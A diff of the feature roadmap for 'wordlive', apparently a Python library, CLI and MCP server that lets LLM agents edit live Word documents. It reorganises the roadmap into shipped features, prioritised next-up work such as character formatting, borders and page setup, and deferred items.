@@ -1,690 +1,613 @@
 # wordlive — feature roadmap
 
-Post-v0 sketch. v0 (the initial commit) covered `attach`/`connect`, anchors
-(bookmark / content control / heading) with read + `set_text`, `doc.edit()`
-with `UndoRecord` + Selection preservation, the LLM-first CLI (`status`,
-`outline`, `read`, `write`, `insert`), typed exceptions, and magic-constant
-enums. This document stages everything else, ordered by **LLM-agent
-leverage** rather than spec order.
+How to read this document, after the 2026-06-01 reorg:
 
-> Two big surfaces are missing from `spec.md` entirely: **tables** and
-> **comments**. Both rank above styles and sections for the actual
-> document-editing workflows wordlive targets. Called out below.
-
----
-
-## v0.1 — close the LLM-tool loop
-
-Small, no new COM territory. Makes the existing CLI actually usable as a
-deterministic tool-call surface. All four items wire existing library
-primitives into the JSON-in / JSON-out shell.
-
-- **`replace --anchor-id <id>`** — `outline()` already emits IDs like
-  `heading:3`; nothing consumes them yet. Add a unified
-  `doc.anchor_by_id(id)` resolver (`heading:N`, `bookmark:NAME`, `cc:NAME`)
-  and a `replace` subcommand that calls `set_text` on the resolved anchor.
-- **`go_to --anchor-id <id>`** — `Document.go_to()` already exists in the
-  library; expose via CLI for the same ID scheme as `replace`.
-- **`exec --script ops.json`** — batch N anchor ops in one `doc.edit()` /
-  `UndoRecord`, so a multi-step LLM edit reverts with one Ctrl-Z. Script
-  format:
-  ```json
-  {
-    "label": "Update report",
-    "ops": [
-      {"op": "write_bookmark", "name": "Address", "text": "..."},
-      {"op": "write_cc", "name": "Signatory", "text": "..."},
-      {"op": "insert_after_heading", "heading": "Risks", "text": "..."},
-      {"op": "replace", "anchor_id": "heading:3", "text": "..."}
-    ]
-  }
-  ```
-  Failure semantics: if op K fails, ops 1..K-1 are already applied; we
-  close the UndoRecord and report failure. User's Ctrl-Z reverts the
-  partial work in one keystroke.
-- **`NamedRange` anchor — deferred.** Spec lists it as an anchor type but
-  Word has no separate "named range" concept (bookmarks *are* named
-  ranges). A real `RangeAnchor` over `doc.range(start, end)` is a useful
-  abstraction but needs its own design pass — push to v0.2 alongside the
-  other Range work.
-
-Estimate: one sitting. Tests build on existing `fake_word` fixture.
+- **Status-first, not version-numbered.** Earlier drafts labelled tranches
+  `v0.9`–`v0.15`, but those numbers decoupled from real releases long ago (the
+  repo is at **v0.11.0**, yet "v0.12" shipped back in release **0.9.0**). The
+  fake labels are gone. Work is now bucketed by **status** and, within "next
+  up", by **priority**. The authoritative release history lives in
+  `CHANGELOG.md`; shipped items below carry the real release they landed in.
+- Three parts: **I — Shipped**, **II — Approved / next up** (priority order),
+  **III — Deferred & declined**. A short **cross-cutting** section and the
+  **open papercuts** close it out.
+- Ordering principle throughout: **LLM-agent leverage**, not spec order.
 
 ---
 
-## v0.2 — styles + tables
+# Part I — Shipped
 
-Two parallel tracks; each is its own PR.
+Quick index (capability → real release):
 
-### Styles — ✅ shipped in v0.3
+| Capability | Release |
+|---|---|
+| Core: `attach`/`connect`, anchors, `doc.edit()` atomic undo, typed errors, CLI | v0.8.0 |
+| `replace`/`go_to`/`exec` by anchor-id; `append`/`prepend`; `start`/`end` | v0.8.0–0.8.2 |
+| Find/replace (fuzzy) | v0.8.0 |
+| Styles (read/apply) + `format_paragraph` | v0.8.0 |
+| Tables (read/edit: cells, rows, grid) | v0.8.0 |
+| Comments, track changes, `RangeAnchor` | v0.8.0 |
+| Lists / numbering; sections / headers / footers | v0.8.0 |
+| `para:N` addressing + cursor surface | v0.8.0 |
+| Image **insertion** (path / bytes / base64, wrap modes) | v0.8.0 |
+| Snapshots (render page/section to PNG) | v0.9.0 |
+| MCP server (`word_read`/`word_write`/`word_exec`/`word_snapshot`) | v0.9.0 |
+| Table **creation / deletion** | v0.9.0 |
+| Page / column / section **breaks** | v0.9.0 |
+| Python-API skill, MCP bundle, `install-mcp`, examples | v0.10.0 |
+| Guide-as-tool-call, `status.saved`, exec `warnings`, paragraph-op split | v0.11.0 |
 
-- ~~`doc.styles["Body Text"]`, `doc.styles.list()`, `style.exists`.~~ ✅
-- ~~`anchor.apply_style(name)` for all anchor types.~~ ✅
-- ~~Wire the existing `--style` arg on `insert` (currently stubbed).~~ ✅ —
-  now validates via `doc.styles[]` before any mutation, exit code 2 on miss.
-- ~~Paragraph formatting that ships alongside: alignment, indent, spacing.~~ ✅
-  via `anchor.format_paragraph(**kwargs)` + `wordlive format-paragraph` CLI.
-- ~~New typed error: `StyleNotFoundError`.~~ ✅ — subclass of
-  `AnchorNotFoundError` so it reuses exit code 2 and `except AnchorNotFoundError`
-  still catches it.
-- Line spacing, character-style modelling, theme-aware fonts, and style
-  creation/modification stay deferred to v0.6+.
+The detail below preserves the **load-bearing reference facts** (addressing
+schemes, gotchas a future change must respect). Deeper deliberation lives in git
+history and `spec.md`.
 
-### Tables — ✅ shipped in v0.4
+## Core loop — anchors, edit scope, exec (v0.8.x)
 
-- ~~`doc.tables` collection — `__getitem__` by index or by table caption.~~ ✅
-  index by 1-based position or `Title`.
-- ~~`Table` wrapper: `row_count`, `column_count`, `cell(row, col)`, iteration.~~ ✅
-  plus `read()` / `grid()` / `to_dict()`.
-- ~~`Cell.text` (read/write), `Cell.anchor` (so bookmarks/CCs inside cells
-  resolve uniformly).~~ ✅ — `Cell` *is* an `Anchor`, so it inherits
-  `apply_style` / `format_paragraph` / `set_text` directly.
-- ~~`Table.add_row(values=None)` / `Table.delete_row(index)`.~~ ✅
-- **Resolved:** anchor-id scheme is `table:N:R:C` for cells; the bare `table:N`
-  is *not* an anchor (a whole table is a collection) and is addressed via
-  `doc.tables[N]` / the `table` CLI group. Cells don't appear in
-  `doc.outline()` (that stays heading-only).
-- **Resolved:** bookmarks inside cells round-trip through `set_text` — covered
-  by an E2E test (`t_bookmark_in_cell_roundtrip`).
-- Deferred: merged/split-cell grids (cell addressing assumes rectangular),
-  cell-level `add_column`/`delete_column`. **Table creation/deletion promoted to
-  v0.12** — the 2026-05 agent test proved it's a hard blocker for building a
-  document from a blank page, not a nicety.
+- `replace --anchor-id <id>`, `go_to --anchor-id <id>`: unified
+  `doc.anchor_by_id(id)` resolver. Anchor-id taxonomy is the stable LLM-visible
+  addressing scheme: `heading:N`, `para:N`, `bookmark:NAME`, `cc:NAME`,
+  `table:N:R:C`, `range:START-END`, `header:S:WHICH` / `footer:S:WHICH`,
+  `start`, `end`.
+- `exec --script ops.json` / `--ops -`: batches N anchor ops in one `doc.edit()`
+  / `UndoRecord`, so a multi-step edit reverts with one Ctrl-Z. **Failure
+  semantics:** if op K fails, ops 1..K-1 are already applied; the UndoRecord
+  closes and failure is reported — one Ctrl-Z reverts the partial work. A
+  successful batch carries an `outputs` array (per structure-creating op) and a
+  `warnings` array (fields an op ignored) since v0.11.0.
 
----
+## Styles + paragraph formatting (v0.8.0)
 
-## v0.5 — collaboration features — ✅ shipped in v0.5
+- `doc.styles["Body Text"]`, `doc.styles.list()`, `style.exists`;
+  `anchor.apply_style(name)` on all anchor types; `insert --style` validates via
+  `doc.styles[]` before mutating (exit 2 on miss).
+- `anchor.format_paragraph(**kwargs)` — alignment, indent, spacing,
+  `page_break_before` (added with breaks) — + `wordlive format-paragraph` CLI.
+- `StyleNotFoundError` subclasses `AnchorNotFoundError` → reuses exit code 2.
+- **Note:** styles are **read-only** — wordlive consumes existing styles, it
+  does not create or modify them. (Promotion candidate in Part II.)
 
-Genuinely LLM-shaped operations: "leave a comment on the Risks section" is
-exactly the kind of polite, side-channel edit agents should prefer over
-direct text mutation.
+## Tables — read/edit (v0.8.0)
 
-> Note: find/replace already shipped in v0.2 (commits `f90e0a9`, `cbe89cc`),
-> styles + paragraph formatting in v0.3 (commit `c03b7d1`), and tables in
-> v0.4. v0.5 closes out the genuinely-collaborative surface below.
+- `doc.tables[N]` (1-based or by `Title`); `Table` wrapper: `row_count`,
+  `column_count`, `cell(row, col)`, iteration, `read()`/`grid()`/`to_dict()`.
+- `Cell` **is** an `Anchor` (inherits `apply_style`/`format_paragraph`/
+  `set_text`); `Table.add_row`/`delete_row`.
+- **Addressing:** cells are `table:N:R:C`; bare `table:N` is **not** an anchor
+  (a whole table is a collection), addressed via `doc.tables[N]` / the `table`
+  CLI group. Cells don't appear in `doc.outline()` (heading-only).
+- Bookmarks inside cells round-trip through `set_text` (E2E-tested).
 
-- ~~**Comments** — `doc.comments.add(anchor, text, author=...)`,
-  `doc.comments.list()`, `comment.resolve()`.~~ ✅ — plus `doc.comments[N]`,
-  `comment.delete()` / `reopen()`, and `comment.scope_text`. Comments attach to
-  any anchor's range without mutating the text.
-- ~~**Track changes** — `with doc.tracked_changes(): ...` flips
-  `TrackRevisions` on for the scope. Pairs with `doc.edit()`.~~ ✅ — plus the
-  `doc.track_changes` read/write property, the `wordlive track on|off|status`
-  CLI toggle, and a `"tracked": true` key on `exec` scripts.
-- ~~**`RangeAnchor`** — `doc.range(start, end)` returns an `Anchor`-shaped
-  wrapper.~~ ✅ — addressed as `range:START-END`, which is now what `find()`
-  emits *and* what `anchor_by_id` resolves, so a find hit feeds straight back
-  into `replace` / `comments.add`. This is what "NamedRange" was reaching for.
-- **Resolved:** comments are addressed by 1-based index (`doc.comments[N]`),
-  matching Word's `Comments(n)`; `comment.resolve()` uses the `Done` flag
-  (Word 2013+). Track-changes exposes both a persistent CLI toggle and a
-  self-restoring `tracked_changes()` scope.
-- Deferred: comment replies (`comment.reply(...)`), per-revision
-  accept/reject (`doc.revisions`), and author/date filtering on `list()`.
+## Collaboration — comments, track changes, RangeAnchor (v0.8.0)
 
----
+- `doc.comments.add(anchor, text, author=…)`, `.list()`, `doc.comments[N]`,
+  `comment.resolve()`/`reopen()`/`delete()`, `comment.scope_text`. Comments
+  attach to any anchor's range without mutating text. Addressed 1-based,
+  matching Word's `Comments(n)`; `resolve()` uses the `Done` flag (Word 2013+).
+- `with doc.tracked_changes(): …` (self-restoring scope) + `doc.track_changes`
+  property + `wordlive track on|off|status` + `"tracked": true` on exec scripts.
+- `doc.range(start, end)` → `RangeAnchor`, addressed `range:START-END` — what
+  `find()` emits *and* what `anchor_by_id` resolves, so a find hit feeds straight
+  into `replace`/`comments.add`.
 
-## v0.6 — lists & document structure — ✅ shipped in v0.6
+## Lists & structure — numbering, sections, headers/footers (v0.8.0)
 
-Two tracks bundled into one release. Headers/footers turned out to be the
-*easy* lift (a `HeaderFooter` is just a range, so it slots into the `Anchor`
-pattern like `Cell` did); lists/numbering was the fiddly half the note below
-warned about — `ListGalleries` / `ApplyListTemplate` / restart-vs-continue.
+- List verbs on the base `Anchor`: `apply_list("bulleted"|"numbered"|"outline",
+  continue_previous=…)`, `remove_list()`, `list_info()`, `restart_numbering()`,
+  `indent_list()`/`outdent_list()`. `doc.lists` is a read-only discovery
+  collection yielding a `RangeAnchor` per list.
+- `doc.sections` collection; `HeaderFooter` **is** an `Anchor`, addressed
+  `header:S:WHICH` / `footer:S:WHICH` (WHICH = primary/first/even) — so
+  `set_text`/`apply_style`/`format_paragraph` work on it; `Section.page_setup()`
+  **reads** (writes deferred — see Part II/III).
 
-- ~~**Numbering / list management** — Word's `ListTemplates` /
-  `ListGalleries` are genuinely painful; isolate this work into its own
-  release rather than bundling.~~ ✅ — list verbs live on the base `Anchor`:
-  `apply_list("bulleted"|"numbered"|"outline", continue_previous=...)`,
-  `remove_list()`, `list_info()`, `restart_numbering()`, `indent_list()` /
-  `outdent_list()`. `doc.lists` is a read-only discovery collection yielding a
-  `RangeAnchor` per list.
-- ~~**Sections / headers / footers** — useful, but mostly for
-  template-generation workflows.~~ ✅ — `doc.sections` collection;
-  `HeaderFooter` *is* an `Anchor` addressed `header:S:WHICH` / `footer:S:WHICH`
-  (WHICH = primary/first/even), so `set_text` / `apply_style` /
-  `format_paragraph` work on it; plus `Section.page_setup()` reads.
-- **Resolved:** list ops are anchor-scoped (they act on a range's paragraphs),
-  so they're methods on `Anchor` rather than a separate object — same shape as
-  `apply_style`. Level control is `indent_list` / `outdent_list` (Word's own
-  promote/demote), avoiding the unreliable direct `ListLevelNumber` write.
-- Deferred: custom list-template authoring, per-level bullet/number-format
-  control, multi-section `LinkToPrevious` editing, and `PageSetup` *writes*
-  (margins/orientation are read-only for now).
+## Paragraph addressing & cursor (v0.8.0)
 
----
-
-## v0.7 — paragraph addressing & cursor surface — ✅ shipped in v0.7
-
-Closes the "I can see headings but can't address the body" gap, unifies the odd
-one-off `insert --after-heading` ergonomics, and adds the explicitly-opt-in
-cursor surface that was the one piece deliberately missing from the
-anchors-over-`Selection` model.
-
-- ~~**`para:N` anchors** — every paragraph (not just headings) is addressable.~~
-  ✅ — `Paragraph(Anchor)` + `doc.paragraphs` collection; `para:N` shares its
-  index space with `heading:N` (a heading is `para:N` *and* `heading:N`).
-  Inherits every anchor verb. New `wordlive paragraphs` listing (emits offsets);
+- `Paragraph(Anchor)` + `doc.paragraphs`; `para:N` shares its index space with
+  `heading:N` (a heading is both). `wordlive paragraphs` listing emits offsets;
   `outline --all` is an alias.
-- ~~**`insert` ergonomics** — match every other command's `--anchor-id`.~~ ✅ —
-  `insert --anchor-id ID --text … [--before|--after] [--style …]` works on any
-  anchor; the old `--after-heading` flag is gone. `insert_paragraph_before/after`
-  lifted to the base `Anchor`. Exec op renamed `insert_after_heading` →
-  `insert_paragraph`.
-- ~~**Cursor surface** — make writing at the live cursor *possible* but clearly
-  non-default.~~ ✅ — `cursor read` / `cursor write` (and `Selection.write`),
-  deliberately *not* an `anchor_by_id` scheme. `cursor write` opts into
-  `EditScope.allow_cursor_move()` so it's the one op that intentionally moves
-  the cursor; `cursor read` reports the containing `para:N`.
-- **Resolved:** offset-precise, mid-paragraph insertion stays a collapsed
-  `range:START-END` target (now discoverable because `paragraphs` emits offsets)
-  rather than a new `insert --inline` verb.
-- Deferred: raw inline `insert_before`/`insert_after` (no new paragraph) on the
-  CLI, and a `write_cursor` exec op (a cursor write fights `EditScope`'s
-  cursor-restore inside a batch, so it stays CLI-only for now).
+- `insert --anchor-id ID --text … [--before|--after] [--style …]` on any anchor
+  (the old `--after-heading` flag is gone; exec op is `insert_paragraph`).
+- `cursor read` / `cursor write` (+ `Selection.write`) — deliberately **not** an
+  `anchor_by_id` scheme. `cursor write` opts into `EditScope.allow_cursor_move()`
+  — the one op that intentionally moves the cursor; `cursor read` reports the
+  containing `para:N`.
+
+## Image insertion (v0.8.0)
+
+- `anchor.insert_image(image, *, wrap, where="after", width=None, height=None,
+  alt_text=None, lock_aspect=True)` — `AddPicture(LinkToFile=False,
+  SaveWithDocument=True)` (always embed). `image` is a path, raw `bytes`, or
+  base64 (priority case: an LLM holding base64); classification + temp-file
+  handling in `_images.image_on_disk`.
+- **`wrap` is required, no default** — `inline|auto|square|tight|through|
+  top-bottom|behind|front`. Non-inline calls `InlineShape.ConvertToShape()` +
+  sets `WrapFormat.Type`. `wrap="auto"` = square if width ≤ half the section's
+  usable text width, else top-bottom.
+- `ImageSourceError(WordliveError)` → exit 1 (bad-input, **not** an
+  AnchorNotFound; six-code contract untouched). CLI `insert-image` + `insert_image`
+  exec op. Relative paths resolved to absolute before COM (fix in v0.10.2).
+
+## Document construction — breaks + table creation (v0.9.0)
+
+- **Breaks:** `anchor.insert_break(kind="page"|"column"|"section_next"|
+  "section_continuous", where="after")` → `Range.InsertBreak`. Plus the clean,
+  reflow-safe primitive `format_paragraph(page_break_before=True)`. `WdBreakType`
+  subset (internal). exec op `insert_break` + CLI + MCP. Two ways to page-break
+  by design: explicit one-off mark vs. paragraph property (guide steers agents to
+  the latter for "every Heading 1 starts a page").
+- **Table creation:** `doc.add_table(rows, cols, *, style=None, data=None,
+  header=False)` + `anchor.insert_table(rows, cols, *, where="after", …)` +
+  `Table.delete()`. `data` is row-major, underfill allowed / overflow rejected;
+  `header=True` bolds row 1; `style=None` → built-in `Table Grid`. exec ops
+  `create_table`/`delete_table`; CLI `table create`/`table delete`.
+- **Gotcha (live-Word only):** adjacent tables silently **merge** if they touch
+  with no paragraph mark between; `insert_table` probes
+  `Range.Information(wdWithInTable)` on each side and drops a separator paragraph
+  only where it abuts an existing table.
+- v0.11.0: new table cells default to `Normal` style (don't inherit a heading
+  anchor's style and pollute the outline).
+
+## Snapshots + MCP + packaging (v0.9.0–0.11.0)
+
+- `Document.snapshot(...)` / `Anchor.snapshot(...)` + `wordlive snapshot` render
+  page(s)/section to PNG (Word → PDF, PyMuPDF rasterises). Optional `snapshot`
+  extra. This is the "let a vision model see the layout" path.
+- MCP server: four dispatch tools + `wordlive://guide` resource (also fetchable
+  as `word_read(command="guide")` since v0.11.0, because resources aren't
+  surfaced by every client). Optional `mcp` extra.
+- Python + CLI agent skills, `.mcpb` bundle, `install-mcp`, `examples/`.
 
 ---
 
-## v0.8 — image insertion ✅ shipped in v0.8
+# Part II — Approved / next up (priority order)
 
-First of the visual-content track. Images fit the anchor model: insertion goes
-through `Range.InlineShapes.AddPicture`, which anchors to a range and reuses the
-collapse-the-range pattern that `insert_paragraph_before/after` already use
-(`_anchors.py`), and lands inside `doc.edit()` for one-Ctrl-Z undo like every
-other mutation. Word auto-detects the natural pixel→points size on insert, so
-the caller never needs to know the image's dimensions.
+Everything here is **specced but not yet implemented** (verified against source
+2026-06-01 — none of these entry points exist yet). Ordered by leverage. The
+top cluster (publishing-quality) was added in the 2026-06-01 reorg; the rest
+were approved 2026-05-31 and carry their original design passes.
 
-- **`anchor.insert_image(image, *, wrap, where="after", width=None, height=None,
-  alt_text=None, lock_aspect=True)`** on the base `Anchor`. `AddPicture` with
-  `LinkToFile=False, SaveWithDocument=True` (embed; never link to a path that can
-  vanish). `width`/`height` in points; `alt_text` → `AlternativeText`.
-- **Resolved — `image` is a path, raw bytes, *or* base64.** The priority case is
-  an LLM holding base64. A `str` is a path when it names an existing file, else
-  base64; `bytes` is raw image data. Bytes/base64 are written to a temp file
-  (extension sniffed from magic bytes), embedded, then cleaned up — all in
-  `_images.image_on_disk`, reused by v0.9 extraction. Widening a `str` path to
-  also accept base64 stayed non-breaking.
-- **Resolved — `where="after"` (default) / `"before"`**, mirroring the `insert`
-  command (`--before/--after` on the CLI) rather than a fixed insertion point.
-- **`wrap` is required — no default.** Forcing an explicit value means the LLM
-  declares layout intent and floating is never a silent surprise. Accepted:
-  `inline | auto | square | tight | through | top-bottom | behind | front`. An
-  unknown value raises `ValueError` (like `_coerce_alignment`).
-- **Wrapping requires a *floating* shape.** An `InlineShape` has no wrap (it's a
-  character in the text flow). `wrap="inline"` keeps it inline; any other value
-  calls `InlineShape.ConvertToShape()` and sets `Shape.WrapFormat.Type`
-  (`WdWrapType`: square=0, tight=1, through=2, top-bottom=3, front=4, behind=5).
-- **`wrap="auto"`** = size heuristic: square if final width ≤ **half the anchor
-  section's usable text width** (`PageWidth − LeftMargin − RightMargin`), else
-  top-bottom. (Letter portrait: usable 468pt, 117→Square, 421→TopBottom.)
-- **Resolved — typed `ImageSourceError(WordliveError)` → exit 1.** Covers a
-  missing/unreadable path, malformed base64, or unrecognised format. It's a
-  *bad-input* error, not a *named-thing-missing* one, so it does **not** subclass
-  `AnchorNotFoundError` (no exit-2 reuse, six-code contract untouched).
-- **CLI:** `wordlive insert-image --anchor-id ID (--path FILE | --base64 VALUE)
-  --wrap WRAP [--before/--after] [--width N] [--height N] [--alt-text …]
-  [--lock-aspect/--no-lock-aspect]` (`--base64 -` reads stdin), plus an
-  `insert_image` exec op (`{op, anchor_id, wrap, where?, path?|base64?, width?,
-  height?, alt_text?, lock_aspect?}` — base64 in a JSON op dodges argv limits).
-- `alt_text` set deliberately — the one piece of an image an LLM can read back
-  without pixel access, so it doubles as a re-identification handle (v0.9).
-- **Deferred:** wrap *side* (`WrapFormat.Side`) + text distance;
-  absolute/relative positioning (`Left`/`Top`, `RelativeHorizontalPosition`,
-  `wdShapeCenter`); cropping; replacing an image in place; forcing the image into
-  its own paragraph; EMF/WMF beyond magic-byte sniffing. (Floating is reached via
-  inline-then-`ConvertToShape`, so direct `Document.Shapes.AddPicture` isn't
-  needed.)
+## ★ Publishing-quality styling & layout (new cluster, 2026-06-01)
 
----
+The audit surfaced that wordlive can *place* content but barely *style* it: there
+is **no run-level character formatting at all**, styles are read-only, and page
+layout is read-only. This cluster closes the "make it look designed" gap. Build
+the prerequisite first, then in order.
 
-## v0.9 — image extraction (read images out for vLLMs)
+### 0. Color / units helper (prerequisite, tiny)
 
-> **Status: approved to build 2026-05-31.** Specced but not yet implemented —
-> only `insert_image` (v0.8) ships today; there is no `read_image`/`doc.images`.
+- One internal module that coerces colors (named → RGB → Word's **BGR long**;
+  Word stores `RGB(r,g,b)` byte-swapped) and lengths (pt / in / cm → points).
+  Underpins font color, highlight, shading, and borders — build once, reuse.
+  Not exported through `__all__` until asked (mirrors the `WdStyleType` pattern).
 
-Spiked before speccing, and it came back clean. `Range.WordOpenXML` returns the
-range as **Flat OPC**, inlining each referenced media part as base64
-(`<pkg:binaryData>`). On a tight per-shape range it carries **exactly that
-shape's image** — verified against a two-image throwaway doc, each shape
-resolving to its own bytes (shape 2 → the second image, not "all media"). So
-extraction is clean where it looked ugly: **no clipboard** (politeness intact),
-**no save-to-temp** (reads the live range, no staleness), **no fragile
-position→media mapping**, and pure stdlib to finish (`xml.etree` + `base64`,
-no Pillow). It's the read half that pairs with v0.8's `insert_image` write.
+### 1. `format_run` — direct character formatting (highest leverage)
 
-- **`anchor.read_image() -> (bytes, str)`** — bytes + MIME type (from the
-  part's `pkg:contentType` — exactly what a vision model needs). Parses the
-  Flat OPC fragment, takes the sole `image/*` part, base64-decodes it. (Each
-  fragment is a self-contained mini-package, so the part is always
-  `image1.<ext>` — the extractor never has to guess a doc-wide name.)
-- **`doc.images`** — read-only discovery collection (mirrors `doc.lists` /
-  `doc.tables`) yielding one handle per `InlineShape`; `list()` emits
-  `[{index, anchor_id, mime, width, height, alt_text, para}]` so an agent sees
-  what's there and where *before* pulling bytes.
-- **CLI:** `wordlive images` (list) and `wordlive read-image --anchor-id ID
-  [--out FILE]` — `--out` writes the bytes and reports `{path, mime, bytes}`;
-  without it, base64 + mime in the JSON (LLM-pipeline friendly, but large).
-- **Resolved:** no `read_image` exec op — extraction is a read, not a mutation,
-  so it stays off the `doc.edit()` batch surface (same reasoning that kept
-  `write_cursor` out in v0.7).
-- **Decide during build:** the addressing scheme (`image:N` 1-based over
-  `InlineShapes` vs. resolving any text anchor that contains exactly one image);
-  base64-in-JSON vs. file-out as the CLI default.
-- **Spike caveats to carry into the spec:** `WordOpenXML` always serializes the
-  full package skeleton (~64 KB floor regardless of image size — negligible once
-  images are real-sized); rapid COM access can return `RPC_E_CALL_REJECTED`,
-  already the `WordBusyError` retry class, so the real path gets retry for free.
-  **Untested:** EMF/WMF vector images and Word's cropped-image-keeps-the-original
-  behavior — exercise both before shipping.
-- **Deferred:** floating-shape (`Document.Shapes`) and chart-image export;
-  OLE/embedded-object extraction; rendering a whole page to an image.
+- **`anchor.format_run(*, bold=None, italic=None, underline=None,
+  strikethrough=None, font=None, size=None, color=None, highlight=None,
+  subscript=None, superscript=None, small_caps=None, all_caps=None,
+  spacing=None)`** on the base `Anchor` — mirrors `format_paragraph`'s tri-state
+  (`None` = leave untouched). Maps to `Range.Font.*` + `Range.HighlightColorIndex`.
+- exec op `format_run` (anchor_id + the kwargs); CLI `wordlive format-run`;
+  MCP `word_write format_run`. Pairs with `range:START-END` for "bold *this*
+  phrase" without restyling the paragraph.
+- **Deferred:** kerning, character scale, animation/text-effects, color via
+  theme-color index (vs. RGB).
 
----
+### 2. Borders, shading & tab stops (the "structured page" layer)
 
-## v0.10 — charts (Excel-backed)
+- **Shading:** `anchor.set_shading(fill=…, pattern=None)` →
+  `Range.Shading.BackgroundPatternColor`. Closes the v0.4 deferred "cell shading"
+  (a `Cell` is an `Anchor`, so it comes for free) and paragraph/range shading.
+- **Borders:** `anchor.set_borders(...)` over `Range.Borders` (and `Table.Borders`
+  / `Section.Borders` for table and page borders) — sides, weight, color, style.
+- **Tab stops:** `anchor.add_tab_stop(position, *, align="left", leader=None)` →
+  `ParagraphFormat.TabStops.Add` — dot-leader rows, price lists, aligned columns
+  without a table.
+- New internal `WdColorIndex` / `WdLineStyle` / `WdTabAlignment` / `WdTabLeader`
+  enum subsets.
+- **Deferred:** diagonal cell borders, art page borders, per-side leader mixing.
 
-> **Status: approved to build 2026-05-31.** Specced but not yet implemented —
-> `insert_chart` does not exist today. Approved as the SmartArt substitute: the
-> "diagram this" intent is served by a real chart (here) or by rendering
-> mermaid/graphviz → PNG into the v0.8 `insert_image`, **not** by native
-> SmartArt (`Shapes.AddSmartArt`), which was considered and declined 2026-05-31
-> — GUID-indexed layouts, floating-only, hard to read back, brittle across Word
-> versions/locales, for an intent charts already cover.
+### 3. Style creation / modification
 
-Follows image insertion. `Range.InlineShapes.AddChart2(Style, Type, …)` embeds
-a chart whose data lives in an embedded Excel workbook
-(`chart.ChartData.Workbook`). Genuinely LLM-shaped ("chart this data") but
-heavier than images on two axes: a new dependency and a much larger surface.
+- **`doc.styles.add(name, *, type="paragraph", based_on=None, next_style=None)`**
+  → `Styles.Add(Name, Type)`, returning a now-**writable** `Style`; setters for
+  `.font` / `.paragraph_format` / `.base_style` / `.next_paragraph_style`.
+  Removes the "read-only" caveat on `_styles.py`. The brand/template primitive:
+  define a house style once, then `apply_style` everywhere.
+- exec op `add_style` / `set_style`; CLI `wordlive style add|set`; MCP mirror.
+- **Decide during build:** how much of `Font`/`ParagraphFormat` to expose on a
+  style (reuse the `format_run`/`format_paragraph` kwarg vocab) vs. a thin
+  passthrough. **Deferred:** list styles, linked styles, style import from a
+  template, `Document.UpdateStyles`.
 
-- **`anchor.insert_chart(kind, data, *, title=None)`** — `kind` maps to an
-  `XlChartType` constant (`"bar"`→`xlColumnClustered`, `"pie"`→`xlPie`,
-  `"scatter"`→`xlXYScatter`, `"line"`→`xlLine`); `data` (a flat
-  label→value mapping) populates `ChartData.Workbook.Worksheets(1)`.
-- **Transitive Excel dependency.** `AddChart2` spins up a hidden Excel instance
-  to back the chart data. Gate behind an "is Excel available?" probe and a
-  typed error, so a missing Excel is a clean exit code rather than exit 1.
-- **Keep v0.9 narrow.** Common chart kinds + a flat `data` mapping only. Defer
-  multi-series, secondary axes, axis/series formatting, and the
-  `ChartData.BreakLink` (embed-vs-link) policy.
-- New `XlChartType` constant subset in `constants.py` — internal, not exported
-  through `__all__` until asked (mirrors how `WdStyleType` was handled).
-- **Deferred:** multi-series data, axis formatting, chart restyling, and
-  reading existing charts back out.
+### 4. PageSetup writes + multi-column (promoted from Deferred)
 
----
+- **`Section.set_page_setup(*, margins=…, orientation=…, paper_size=…,
+  columns=…, gutter=…)`** — the write mirror of the v0.6 `page_setup()` read.
+  Margins/gutter in points (via the units helper), orientation/paper-size via
+  `WdOrientation`/`WdPaperSize`, **columns** via `TextColumns.SetCount` /
+  `.Add` (newspaper layout — a real publishing primitive, and the section
+  half of the `insert_break(kind="column")` story).
+- CLI `wordlive page-setup`; MCP mirror. **Decide:** document-scope vs.
+  per-section scope; unit defaulting. **Deferred:** line numbers, vertical
+  alignment, page color/background, different-first-page toggles.
 
-## v0.12 — document construction: tables & breaks
+### 5. Publishing flourishes (grab-bag, ship as cheap)
 
-**Highest-priority remaining item despite the number** — promoted out of the
-v0.4 "deferred" line by the 2026-05 agent test (build a styled multi-page
-service catalogue from a blank document). That test proved the shape of the gap:
-every verb wordlive has *edits existing structure*, but you cannot **create a
-table** or **force a page break** from nothing. Both are table stakes for the
-"generate a document" workflow — reports, catalogues, templates — which is now a
-first-class use case (`snapshot` + the MCP server shipped specifically to
-support it). Do the breaks first (tiny), then tables.
+- **Page-number fields** — `Footer.insert_page_number()` /
+  `Footers(…).PageNumbers.Add()` (or the general field primitive below).
+  Today headers/footers take only literal text; *any* multi-page deliverable
+  needs `{ PAGE }` / `{ NUMPAGES }`.
+- **General `Fields.Add` primitive** — `anchor.insert_field(kind, text=None)`
+  over `Range.Fields.Add` (date, page, ref, TOC, …). Generalizes the
+  field-refresh machinery the TOC/cross-ref specs already need
+  (`doc.update_fields()`), and underpins page numbers above.
+- **Watermark** — `doc.set_watermark(text, …)` via the header-story
+  `Shapes.AddTextEffect` (WordArt) — DRAFT/CONFIDENTIAL stamps.
+- **Drop cap** — `paragraph.set_drop_cap(lines=3, position="dropped")` →
+  `Paragraph.DropCap`. **Text box / pull quote** — `anchor.insert_text_box(text,
+  …)` → `Shapes.AddTextbox`.
+- These are individually small; bundle whichever land cheap, defer the rest.
 
-### Page & section breaks — ✅ shipped
+## Image extraction — read images out for vLLMs
 
-The agent test got 7-page layout only by appending paragraphs whose text was a
-literal form-feed (`\f`, which Word reads as `Chr(12)` = a manual page break).
-It works but is undiscoverable, undocumented, and leaves a stray empty paragraph
-at each break.
+Spiked clean (2026-05-31): `Range.WordOpenXML` returns the range as Flat OPC,
+inlining each referenced media part as base64 on a tight per-shape range — no
+clipboard, no save-to-temp, no fragile position→media mapping, pure stdlib
+(`xml.etree` + `base64`).
 
-- ~~**`format_paragraph(page_break_before=True)`** — the *clean* primitive: make
-  every `Heading 1` open a new page via the paragraph property (survives reflow,
-  no stray paragraph). Add as a new key on the existing `format_paragraph`
-  surface + the `format_paragraph` exec op + a CLI flag.~~ ✅ — new
-  `page_break_before` kwarg on `format_paragraph` (sets `ParagraphFormat.PageBreakBefore`);
-  threaded through the `format_paragraph` exec op + the MCP `format_paragraph`
-  command, with a `--page-break-before/--no-page-break-before` CLI flag (tri-state:
-  `None` leaves it untouched).
-- ~~**`anchor.insert_break(kind="page" | "column" | "section_next" | "section_continuous")`**
-  → `Range.InsertBreak(Type=wd*Break)`, for explicit one-off breaks.~~ ✅ —
-  lives on the base `Anchor` (every position anchor gets it), `where="after"`
